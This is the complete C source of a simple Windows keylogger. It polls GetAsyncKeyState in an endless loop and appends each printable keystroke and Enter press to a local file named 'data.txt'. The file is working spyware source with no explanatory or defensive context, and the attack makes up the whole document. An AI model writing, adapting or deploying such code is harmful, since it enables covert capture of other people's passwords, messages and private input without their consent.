#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define LOGFILE "data.txt"

void log_key(int key) {
    FILE *file = fopen(LOGFILE, "a");
    if (file == NULL) {
        printf("Error opening file.\n");
        return;
    }

    if (key == VK_RETURN) {
        fprintf(file, "\n"); 
    } else if (key >= 32 && key <= 126) { 
        fputc(key, file);
    }
    fclose(file);
}

int main() {
    while (1) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x0001) { 
                log_key(key);
            }
        }
        Sleep(10); 
    }
    return 0;
}
